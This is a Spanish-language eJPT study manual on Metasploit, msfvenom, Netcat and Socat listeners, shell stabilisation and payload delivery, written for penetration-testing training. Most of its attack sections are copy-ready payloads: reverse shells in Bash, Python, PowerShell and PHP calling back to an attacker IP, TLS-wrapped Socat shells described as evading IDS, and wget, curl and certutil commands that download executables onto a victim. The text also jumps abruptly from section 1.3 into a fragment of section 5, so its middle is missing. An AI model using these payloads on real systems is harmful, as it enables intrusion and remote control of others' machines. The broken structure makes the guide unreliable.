# 🛡️ GUÍA COMPLETA DE METASPLOIT, SHELLS, OYENTES Y GENERACIÓN DE PAYLOADS
### *Manual Extensivo y Guía de Referencia Técnica – Certificación eJPT*

---

> **Estructura del Manual:** Organizado exactamente en orden cronológico según las 6 fuentes de Notion seleccionadas. Cada sección principal corresponde a un módulo y contiene explicaciones conceptuales exhaustivas, arquitecturas, comandos, banderas, desgloses paso a paso, ejemplos prácticos, técnicas de evasión y métodos de estabilización. La redacción es fluida y narrativa en texto corrido, sin viñetas fuera de bloques de código o tablas, ideal para consultar durante exámenes y auditorías de seguridad.

---

## 🚀 Matriz de Consulta Rápida (Cheat Sheet de Metasploit, Shells y Oyentes)

| Categoría / Herramienta | Comando / Sintaxis Principal | Propósito / Indicador de Éxito |
| :--- | :--- | :--- |
| **Inicio y BD Metasploit** | `sudo msfdb init && msfconsole` | Inicializa PostgreSQL y lanza la consola conectada a la base de datos. |
| **Búsqueda Filtrada** | `search type:exploit platform:windows cve:2017` | Filtra módulos específicos por categoría, sistema operativo y CVE. |
| **Configuración Básica** | `use <módulo>` \| `setg RHOSTS <IP>` \| `set LHOST <IP>` | Selecciona el módulo y fija parámetros globales o locales de conexión. |
| **Oyente Universal MSF** | `use exploit/multi/handler` \| `set PAYLOAD ...` \| `run -j` | Captura conexiones entrantes de payloads escenificados o sin etapas en segundo plano. |
| **Generación Msfvenom EXE** | `msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=<IP> LPORT=4444 -f exe -o s.exe` | Genera un ejecutable sin etapas independiente para Windows de 64 bits. |
| **Generación Msfvenom ELF** | `msfvenom -p linux/x64/meterpreter_reverse_tcp LHOST=<IP> LPORT=4444 -f elf -o s.elf` | Genera un binario independiente ejecutable para sistemas Linux. |
| **Web Shell PHP** | `msfvenom -p php/meterpreter_reverse_tcp LHOST=<IP> LPORT=4444 -f raw -o s.php` | Genera una carga útil web para servidores PHP (verificar etiqueta `<?php`). |
| **Oyente Netcat Básico** | `nc -lvnp 4444` | Inicia un oyente TCP en el puerto 4444 para capturar reverse shells simples. |
| **Reverse Shell Netcat** | `nc <IP_ATACANTE> 4444 -e /bin/bash` | Conecta el objetivo de vuelta al oyente ejecutando una consola interactiva. |
| **Oyente Socat TTY** | `socat FILE:`tty`,raw,echo=0 TCP-L:4444` | Oyente avanzado de Socat listo para recibir un pseudoterminal TTY completo. |
| **Reverse Shell Socat TTY** | `socat TCP:<IP>:4444 EXEC:"bash -li",pty,stderr,setsid,sigint,sane` | Envía una shell TTY totalmente interactiva con manejo de Ctrl+C y señales. |
| **Certificado Cifrado SSL** | `openssl req -newkey rsa:2048 -nodes -keyout s.key -x509 -days 365 -out s.crt && cat s.key s.crt > s.pem` | Genera un certificado PEM autofirmado para envolver tráfico de shell en TLS. |
| **Oyente Cifrado Socat** | `socat OPENSSL-LISTEN:443,cert=s.pem,verify=0 -` | Inicia un oyente cifrado SSL/TLS indetectable para inspección de tráfico plano. |
| **Estabilización Python TTY** | `python3 -c 'import pty; pty.spawn("/bin/bash")'` | Eleva un shell Netcat plano a un pseudoterminal interactivo. |

---

## 1. Metasploit: Los Fundamentos (Metasploit: The Basics)

### 1.1. Introducción al Metasploit Framework
El Metasploit Framework representa el entorno de explotación de código abierto más utilizado en la industria de la ciberseguridad y las pruebas de penetración. Creado originalmente por H. D. Moore en el año 2003 como una herramienta portátil en Perl y posteriormente reescrito en Ruby, el proyecto fue adquirido por Rapid7 en 2009. Desde entonces, ha evolucionado hasta convertirse en un ecosistema masivo que alberga miles de módulos de explotación, escáneres auxiliares, cargas útiles y herramientas de post-explotación.

Para comprender la utilidad de Metasploit en un escenario real, conviene utilizar la analogía de un taller mecánico profesional. Un especialista no intenta construir sus herramientas desde cero cada vez que debe reparar un vehículo, sino que recurre a un panel organizado donde cada llave, alicate o diagnóstico computarizado se encuentra ubicado en su lugar correspondiente. De la misma manera, durante un compromiso con tiempo limitado, un pentester necesita un marco estructurado que organice exploits conocidos, los vincule con las cargas útiles adecuadas y proporcione una interfaz unificada para configurar y lanzar ataques contra la infraestructura objetivo.

Metasploit cubre la totalidad del ciclo de vida de una auditoría de seguridad, dividiéndose en fases clave que abarcan la recopilación de información y escaneo de servicios, la identificación y comprobación de vulnerabilidades, la explotación o entrega del código malicioso, la post-explotación para mantener el acceso y recolectar credenciales, y la generación de registros detallados para la elaboración del informe final.

Existen dos ediciones principales del software. Por un lado, Metasploit Pro es la versión comercial con licencia mantenida por Rapid7, la cual incluye una interfaz gráfica de usuario (GUI), flujos de trabajo automatizados, herramientas de colaboración en equipo y generadores automáticos de informes. Por otro lado, Metasploit Framework es la versión de código abierto impulsada por la comunidad que se ejecuta íntegramente desde la línea de comandos. Esta última es la versión incluida por defecto en distribuciones como Kali Linux o Parrot OS, y todas las técnicas aprendidas en ella son directamente aplicables a la versión comercial, ya que los módulos y comandos subyacentes son idénticos.

El marco se sostiene conceptualmente sobre tres pilares fundamentales:
`msfconsole`: Es la interfaz de línea de comandos central desde la cual se gestionan todas las operaciones. Funciona como la cabina de mando desde la que se buscan módulos, se configuran parámetros, se ejecutan ataques y se administran las sesiones activas.
`Módulos`: Son los bloques de construcción individuales del marco. Cada módulo es un archivo de código independiente diseñado para realizar una tarea específica, ya sea escanear un puerto, explotar un fallo o volcar contraseñas de la memoria.
`Herramientas independendientes`: Son utilidades complementarias que se ejecutan fuera de la consola principal. La más destacada es `msfvenom`, utilizada para la generación independiente de cargas útiles ejecutables, web shells o código de shell sin procesar.

### 1.2. Conceptos Clave y la Cadena de Explotación
Dentro del ámbito de la seguridad informática existen tres términos que se utilizan constantemente y cuya distinción precisa es indispensable para cualquier auditor:
`Vulnerabilidad`: Es un defecto de diseño, una falla de programación o una mala configuración en un sistema objetivo. La vulnerabilidad por sí sola no causa un daño directo, sino que crea la oportunidad o la puerta de entrada para que ocurra un impacto no deseado.
`Exploit`: Es el fragmento de código o la secuencia de comandos diseñada para aprovechar una vulnerabilidad específica. El exploit es el mecanismo de ataque que desencadena el fallo en el servicio de manera controlada.
`Payload` (Carga Útil): Es el código ejecutable que se entrega y ejecuta en el sistema objetivo una vez que el exploit ha tenido éxito. Mientras que el exploit abre la brecha, la carga útil es lo que actúa en el interior, ya sea abriendo una consola remota, creando una cuenta de usuario o ejecutando comandos.

Esta cadena de tres partes es indivisible. Un exploit sin carga útil puede provocar la caída de un servicio, pero no otorga control al atacante. Una carga útil sin un exploit carece de un medio para alcanzar e inyectarse en la memoria de la víctima.

Metasploit clasifica toda su biblioteca en siete categorías de módulos principales:
`Exploits`: Módulos diseñados para aprovechar vulnerabilidades específicas en aplicaciones o sistemas operativos.
`Auxiliary`: Módulos que realizan tareas que no implican la entrega directa de una carga útil, como escáneres de puertos, detectores de versiones, módulos de fuerza bruta, fuzzers y analizadores de tráfico.
`Payloads`: Módulos de código que se ejecutan en la víctima tras una explotación exitosa.
`Post`: Módulos de post-explotación que se ejecutan sobre una sesión ya establecida para recolectar información, escalar privilegios o pivotar.
`Encoders`: Módulos que transforman el código de la carga útil para eliminar caracteres prohibidos o modificar su estructura de bytes.
`NOPs`: Módulos que generan secuencias de instrucciones de no operación (como `0x90` en x86) utilizadas como relleno en ataques de desbordamiento de búfer.
`Evasion`: Módulos diseñados específicamente para generar ejecutables que eludan controles de seguridad como antivirus o EDRs.

Dentro de la categoría de cargas útiles, Metasploit distingue tres tipos según su arquitectura de entrega:
`Singles` (o Cargas Útiles Inline / Sin Etapas): Son archivos autónomos donde todo el código necesario está empaquetado en un solo bloque. Se ejecutan en un único paso, siendo altamente fiables porque no dependen de descargas de red posteriores.
`Stagers`: Son cargas útiles muy pequeñas cuyo único propósito es establecer una conexión inicial de red entre la víctima y el atacante para descargar el componente principal.
`Stages`: Son los bloques de código más grandes y complejos (como la carga útil completa de Meterpreter) que el stager descarga e inyecta directamente en la memoria RAM del objetivo.

La convención de nomenclatura de Metasploit permite identificar de inmediato si una carga útil es sin etapas o por etapas analizando la sintaxis del nombre. Si el tipo de shell y el método de conexión están separados por un guión bajo (`_`), como en `windows/x64/shell_reverse_tcp`, se trata de una carga útil **sin etapas (singles/inline)**. Si están separados por una barra diagonal (`/`), como en `windows/x64/shell/reverse_tcp`, se trata de una carga útil **por etapas (staged)**.

### 1.3. Navegación por Msfconsole
La consola interactiva `msfconsole` se inicia ejecutando el comando `msfconsole` en la terminal de Linux. Tras unos segundos de carga, la interfaz presenta un banner en arte ASCII junto con el recuento actualizado de módulos disponibles y cambia el indicador de la consola a `msf6 >`.

Desde el interior de `msfconsole` es posible ejecutar comandos nativos del sistema operativo Linux como `ip a`, `whoami` o `pwd`, ya que la consola los redirige automáticamente al shell subyacente. Sin embargo, no se admiten redirecciones de flujo mediante tuberías o símbolos como `>` o `>>`. Para guardar la salida de la consola en un archivo de texto, se debe utilizar el comando interno `spool nombre_archivo.txt`.

`socat TCP:10.10.14.12:4444 EXEC:/bin/bash`

**Reverse Shell en Windows:**
Oyente en la máquina atacante:
`socat TCP-L:4444 -`

Ejecución en la víctima Windows (usando tuberías de Windows):
`socat TCP:10.10.14.12:4444 EXEC:'cmd.exe',pipes` o `EXEC:'powershell.exe',pipes`

**Bind Shell básica:**
Ejecución en la víctima:
`socat TCP-L:7777 EXEC:/bin/bash`

Conexión desde el atacante:
`socat TCP:IP_VICTIMA:7777 -`

### 5.5. Estabilización de Shells (Shell Stabilisation)
Un shell retransmitido a través de un Netcat básico es frágil: pulsar `Ctrl + C` mata la sesión en lugar de cancelar un comando remoto, las flechas de dirección imprimen caracteres extraños (`^[[A`), la tecla Tabulación no autocompleta y editores como `vim` o `nano` no funcionan.

Existen tres técnicas estándar para elevar un shell básico a un pseudoterminal (TTY) plenamente interactivo:

#### Técnica 1: Elevación a TTY mediante Python
Para comenzar, se comprueban las dimensiones de la terminal local en la máquina atacante ejecutando `stty size` (por ejemplo, devuelve `24 80` o `38 116`).
Posteriormente, se obtiene la reverse shell inicial de Netcat.
Una vez en el shell remoto, se invoca el módulo `pty` de Python:
   `python3 -c 'import pty; pty.spawn("/bin/bash")'`
A continuación, se define la variable de entorno de terminal:
   `export TERM=xterm`
Tras esto, se envía el shell al segundo plano pulsando `Ctrl + Z`.
En la terminal local de la máquina atacante, se ajusta el modo de entrada de la consola para pasar caracteres en bruto sin eco local:
   `stty raw -echo; fg`
Al regresar al shell remoto mediante `fg`, se ajustan las filas y columnas según las dimensiones obtenidas previamente:
   `stty rows 38 cols 116`

*(Nota: Si la sesión se interrumpe de forma inesperada mientras el modo `raw` está activo, la terminal local parecerá no responder. Se soluciona a ciegas escribiendo `reset` y pulsando Enter, o ejecutando `stty sane`).*

#### Técnica 2: Uso del Envoltorio Readline (`rlwrap`)
Se antepone `rlwrap` al comando de escucha de Netcat en la máquina atacante:

`rlwrap nc -lvnp 4444`

Al recibir la conexión, se ejecuta `python3 -c 'import pty; pty.spawn("/bin/bash")'`, permitiendo de inmediato disponer de historial de comandos con las flechas del teclado y autocompletado mediante la tecla Tabulación.

#### Técnica 3: Shell TTY Totalmente Interactivo con Socat
Esta técnica proporciona la experiencia más estable posible (equivalente a una conexión SSH directa) asignando un pseudoterminal completo con gestión de señales de control de trabajo.

Primero, se monta un servidor web temporal en la máquina atacante para compartir el ejecutable binario estático de Socat:
   `python3 -m http.server 80`
Segundo, se descarga el binario en la víctima Linux y se le otorgan permisos de ejecución:
   `wget http://10.10.14.12/socat -O /tmp/socat && chmod +x /tmp/socat`
Tercero, se inicia el oyente PTY en la máquina atacante:
   `socat FILE:`tty`,raw,echo=0 TCP-L:4444`
Cuarto, se ejecuta el cliente Socat TTY en la víctima:
   `/tmp/socat TCP:10.10.14.12:4444 EXEC:"bash -li",pty,stderr,setsid,sigint,sane`

### 5.6. Shells Cifradas (Encrypted Shells)
Las conexiones de shell en texto plano que circulan por puertos inusuales (como el 4444) son fácilmente identificables por sistemas IDS/IPS y cortafuegos con inspección profunda de paquetes (DPI). Al envolver el tráfico de shell en una capa de cifrado SSL/TLS, la comunicación se vuelve indistinguible del tráfico HTTPS legítimo.

**Paso 1: Generación del Certificado Autofirmado PEM**
En la máquina atacante se genera una clave privada RSA de 2048 bits y un certificado X.509 autofirmado válido por un año, combinando ambos elementos en un único archivo PEM:

`openssl req -newkey rsa:2048 -nodes -keyout shell.key -x509 -days 365 -out shell.crt && cat shell.key shell.crt > shell.pem`

**Paso 2: Oyente Cifrado con Socat**
Se inicia el oyente indicando el certificado creado y desactivando la verificación de cadena de confianza (`verify=0`):

`socat OPENSSL-LISTEN:443,cert=shell.pem,verify=0 -`

**Paso 3: Reverse Shell Cifrada en la Víctima**
En la víctima Linux se establece la conexión SSL cifrada indicando el puerto 443:

`socat OPENSSL:10.10.14.12:443,verify=0 EXEC:/bin/bash`

**Reverse Shell Cifrada en Windows:**
En la víctima Windows se ejecuta pasando el intérprete de comandos con tuberías:

`socat OPENSSL:10.10.14.12:443,verify=0 EXEC:'cmd.exe',pipes`

**Reverse Shell Cifrada con TTY Completo:**
Oyente en la máquina atacante:
`socat FILE:`tty`,raw,echo=0 OPENSSL-LISTEN:443,cert=shell.pem,verify=0`

Cliente en la víctima Linux:
`/tmp/socat OPENSSL:10.10.14.12:443,verify=0 EXEC:"bash -li",pty,stderr,setsid,sigint,sane`

---

## 6. Generación y Entrega de Payloads de Shell (Shell Payload Generation & Delivery)

### 6.1. Cargas Útiles Comunes de Shell
Dependiendo de las tecnologías presentes en el servidor víctima, existen diferentes payloads y scripts estándar para desencadenar una reverse shell:

**Bash TCP Reverse Shell:**
`bash -i >& /dev/tcp/10.10.14.12/4444 0>&1`

**Python Reverse Shell (Linux/Windows):**
`python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.12",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'`

**PowerShell Reverse Shell (Windows):**
`powershell -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.14.12',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"`

**PHP Reverse Shell:**
`php -r '$sock=fsockopen("10.10.14.12",4444);exec("/bin/sh -i <&3 >&3 2>&3");'`

### 6.2. Estrategias de Transferencia y Entrega
Una vez generada la carga útil en la máquina atacante (ya sea un binario ELF, un ejecutable EXE o una web shell PHP), se deben emplear canales de transferencia eficientes para depositar el archivo en el objetivo:

**Servidor HTTP Integrado en Python:**
En la máquina atacante, desde el directorio donde reside el archivo generado:
`python3 -m http.server 80`

**Descarga en Linux:**
En la máquina víctima se utiliza `curl` o `wget`:
`wget http://10.10.14.12/payload.elf -O /tmp/payload.elf && chmod +x /tmp/payload.elf`
`curl http://10.10.14.12/payload.elf -o /tmp/payload.elf && chmod +x /tmp/payload.elf`

**Descarga en Windows:**
En la víctima Windows se recurre a PowerShell o `certutil`:
`powershell -c "Invoke-WebRequest -Uri 'http://10.10.14.12/payload.exe' -OutFile 'C:\Windows\Tasks\payload.exe'"`
`certutil -urlcache -f http://10.10.14.12/payload.exe C:\Windows\Tasks\payload.exe`

**Transferencia mediante Codificación Base64:**
Cuando los canales de red directa están bloqueados o existen filtros de caracteres en la entrada, se puede codificar la carga útil en Base64 en la máquina atacante (`cat payload.exe | base64 -w 0`) y decodificarla directamente en la víctima en memoria o disco (`echo 'CADENA_BASE64' | base64 -d > /tmp/payload.elf`).

### 6.3. Automatización del Flujo de Explotación
Un proceso de explotación profesional debe seguir un flujo coordinado sin fisuras para evitar la pérdida de accesos iniciales:

Fase de **Planificación e Identificación:** Determinar el sistema operativo, arquitectura y restricciones de red del objetivo.
Fase de **Generación de la Carga Útil:** Seleccionar el payload exacto en `msfvenom` o preparar el script de shell correspondiente fijando los parámetros `LHOST` y `LPORT`.
Fase de **Puesta en Escucha del Oyente:** Iniciar el oyente adecuado (Netcat con `rlwrap`, Socat TTY/SSL o el módulo `exploit/multi/handler` en `msfconsole`) **antes** de activar el código malicioso.
Fase de **Entrega e Invocación:** Transferir la carga útil a la víctima mediante un servidor web Python, carga de archivos o inyección de comandos, y desencadenar su ejecución.
Fase de **Estabilización Inmediata:** Elevar la sesión capturada a un pseudoterminal TTY completo o migrar el proceso en Meterpreter a una ubicación estable del sistema para garantizar la persistencia del acceso durante toda la auditoría.
